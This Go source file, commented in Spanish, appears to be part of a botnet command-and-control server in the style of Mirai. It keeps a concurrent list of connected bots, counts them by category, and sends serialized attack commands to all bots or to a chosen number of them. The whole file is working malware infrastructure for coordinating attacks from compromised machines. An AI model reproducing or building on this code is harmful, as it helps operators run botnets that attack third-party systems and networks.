/**
 * @file clientList.go
 * @brief Implementación del administrador de bots conectados al servidor CNC
 *
 * Este archivo contiene la lógica para:
 * - Gestión concurrente de la lista de bots conectados
 * - Distribución de comandos de ataque a los bots
 * - Estadísticas y monitoreo de bots conectados
 * - Control de acceso thread-safe a la lista de bots
 */

package main

import (
	"fmt"       // Para logging de eventos
	"math/rand" // Para selección aleatoria de bots
	"sync"      // Para sincronización y mutex
	"time"      // Para operaciones con tiempo y semillas aleatorias
)

/**
 * AttackSend representa un comando de ataque para distribuir a los bots
 *
 * Esta estructura se usa para enviar comandos de ataque a un subconjunto
 * de bots, permitiendo filtrar por categoría y limitar la cantidad.
 */
type AttackSend struct {
	buf     []byte // Datos del comando de ataque serializado
	count   int    // Número máximo de bots a usar (-1 = todos)
	botCata string // Categoría de bots a usar ("" = todas)
}

/**
 * ClientList gestiona la lista de bots conectados de forma thread-safe
 *
 * Esta estructura implementa un sistema de colas y canales para manejar
 * de forma segura y concurrente:
 * - Adición/eliminación de bots
 * - Distribución de comandos
 * - Conteo y estadísticas
 *
 * Usa canales Go para comunicación entre goroutines y mutex para
 * sincronización cuando es necesario.
 */
type ClientList struct {
	uid         int                 // Contador para generar IDs únicos de bot
	count       int                 // Número total de bots conectados
	clients     map[int]*Bot        // Mapa de ID a instancia de bot
	addQueue    chan *Bot           // Canal para agregar nuevos bots
	delQueue    chan *Bot           // Canal para eliminar bots
	atkQueue    chan *AttackSend    // Canal para distribuir ataques
	totalCount  chan int            // Canal para actualizar contador total
	cntView     chan int            // Canal para consultar contador
	distViewReq chan int            // Canal para solicitar distribución
	distViewRes chan map[string]int // Canal para respuesta de distribución
	cntMutex    *sync.Mutex         // Mutex para operaciones de conteo
}

/**
 * NewClientList crea y configura una nueva instancia de ClientList
 *
 * Esta función:
 * 1. Inicializa todos los canales y estructuras de datos
 * 2. Inicia las goroutines worker y fastCountWorker
 * 3. Configura los búferes de canal apropiados para rendimiento
 *
 * @return Puntero a la nueva instancia de ClientList lista para usar
 */
func NewClientList() *ClientList {
	// Creamos la instancia con todos sus componentes
	c := &ClientList{
		uid:         0,                         // Inicio del contador de IDs
		count:       0,                         // Inicio del contador de bots
		clients:     make(map[int]*Bot),        // Mapa vacío de bots
		addQueue:    make(chan *Bot, 128),      // Buffer grande para conexiones rápidas
		delQueue:    make(chan *Bot, 128),      // Buffer grande para desconexiones rápidas
		atkQueue:    make(chan *AttackSend),    // Canal sin buffer para control de flujo
		totalCount:  make(chan int, 64),        // Buffer para actualizaciones de contador
		cntView:     make(chan int),            // Canal sin buffer para consultas síncronas
		distViewReq: make(chan int),            // Canal para solicitudes de distribución
		distViewRes: make(chan map[string]int), // Canal para respuestas de distribución
		cntMutex:    &sync.Mutex{},             // Mutex para sincronización
	}

	// Iniciamos las goroutines trabajadoras
	go c.worker()          // Maneja operaciones principales
	go c.fastCountWorker() // Maneja actualizaciones de contador

	return c
}

/**
 * Count obtiene el número total de bots conectados de forma thread-safe
 *
 * Esta función usa un mutex y canales para obtener el conteo actual
 * de forma segura sin bloquear las operaciones de add/delete.
 *
 * @return Número total de bots conectados actualmente
 */
func (this *ClientList) Count() int {
	// Protegemos la operación con mutex
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	// Solicitamos el conteo actual y esperamos respuesta
	this.cntView <- 0
	return <-this.cntView
}

/**
 * Distribution obtiene estadísticas de distribución de bots por categoría
 *
 * Retorna un mapa que asocia cada categoría de bot (source) con el
 * número de bots de esa categoría que están conectados.
 *
 * @return Mapa de categoría -> cantidad de bots
 */
func (this *ClientList) Distribution() map[string]int {
	// Protegemos la operación con mutex
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	// Solicitamos la distribución y esperamos respuesta
	this.distViewReq <- 0
	return <-this.distViewRes
}

/**
 * AddClient agrega un nuevo bot a la lista de forma asíncrona
 *
 * @param c Bot a agregar a la lista
 */
func (this *ClientList) AddClient(c *Bot) {
	// Encolamos el bot para ser agregado por el worker
	this.addQueue <- c
}

/**
 * DelClient elimina un bot de la lista de forma asíncrona
 *
 * @param c Bot a eliminar de la lista
 */
func (this *ClientList) DelClient(c *Bot) {
	// Encolamos el bot para ser eliminado
	this.delQueue <- c
	// Registramos la desconexión del bot
	fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}

/**
 * QueueBuf encola un comando de ataque para ser distribuido a los bots
 *
 * @param buf     Buffer con el comando serializado
 * @param maxbots Número máximo de bots a usar (-1 = todos)
 * @param botCata Categoría de bots a usar ("" = todas)
 */
func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	// Creamos y encolamos la estructura de ataque
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

/**
 * fastCountWorker maneja las actualizaciones del contador total de bots
 *
 * Esta goroutine se encarga de:
 * - Actualizar el contador cuando se agregan/eliminan bots
 * - Responder a consultas sobre el total actual
 *
 * Usa un canal dedicado para mayor rendimiento en operaciones de conteo
 * que son muy frecuentes.
 */
func (this *ClientList) fastCountWorker() {
	// Loop infinito procesando mensajes
	for {
		select {
		case delta := <-this.totalCount:
			// Actualizamos el contador (±1 según sea add/del)
			this.count += delta
			break
		case <-this.cntView:
			// Respondemos con el total actual
			this.cntView <- this.count
			break
		}
	}
}

/**
 * worker es la goroutine principal que maneja todas las operaciones
 * sobre la lista de bots
 *
 * Esta goroutine se encarga de:
 * - Agregar y eliminar bots de forma segura
 * - Distribuir comandos de ataque
 * - Mantener estadísticas actualizadas
 * - Responder a consultas de estado
 */
func (this *ClientList) worker() {
	// Inicializamos el generador de números aleatorios
	rand.Seed(time.Now().UTC().UnixNano())

	// Loop infinito procesando mensajes
	for {
		select {
		case add := <-this.addQueue:
			// Agregamos un nuevo bot
			this.totalCount <- 1        // Incrementamos contador
			this.uid++                  // Generamos nuevo ID
			add.uid = this.uid          // Asignamos ID al bot
			this.clients[add.uid] = add // Agregamos al mapa
			break

		case del := <-this.delQueue:
			// Eliminamos un bot
			this.totalCount <- -1         // Decrementamos contador
			delete(this.clients, del.uid) // Eliminamos del mapa
			break

		case atk := <-this.atkQueue:
			// Procesamos comando de ataque
			if atk.count == -1 {
				// Enviar a todos los bots que coincidan con la categoría
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				// Enviar solo a un número limitado de bots
				var count int
				for _, v := range this.clients {
					// Verificamos si alcanzamos el límite
					if count > atk.count {
						break
					}
					// Enviamos si coincide la categoría
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break

		case <-this.cntView:
			// Respondemos consulta de conteo total
			this.cntView <- this.count
			break

		case <-this.distViewReq:
			// Creamos mapa para estadísticas de distribución
			res := make(map[string]int)

			// Contamos bots por categoría
			for _, v := range this.clients {
				if ok, _ := res[v.source]; ok > 0 {
					// Incrementamos contador existente
					res[v.source]++
				} else {
					// Iniciamos contador para nueva categoría
					res[v.source] = 1
				}
			}

			// Enviamos resultados
			this.distViewRes <- res
		}
	}
}
